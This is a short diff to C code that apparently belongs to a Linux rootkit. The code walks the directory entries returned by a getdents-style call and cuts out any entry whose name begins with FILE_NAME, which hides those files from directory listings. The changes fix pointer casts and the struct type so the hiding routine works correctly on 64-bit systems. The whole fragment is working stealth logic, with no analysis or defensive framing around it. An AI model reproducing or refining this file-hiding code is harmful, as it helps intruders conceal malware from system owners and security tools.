@@ -34,13 +34,13 @@ d_name:   Filename (null-terminated)
 
     if (strncmp(cur->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
       char *next_rec = (char *)cur + size;
-      int len = (int)dirp + rtn - (int)next_rec;
+      int len = (uintptr_t)dirp + rtn - (uintptr_t)next_rec;
       memmove(cur, next_rec, len);
       rtn -= size;
       continue;
     }
     i += size;
-    cur = (struct linux_dirent*) ((char*)dirp + i);
+    cur = (struct linux_dirent64*) ((char*)dirp + i);
   }
 
   return rtn;
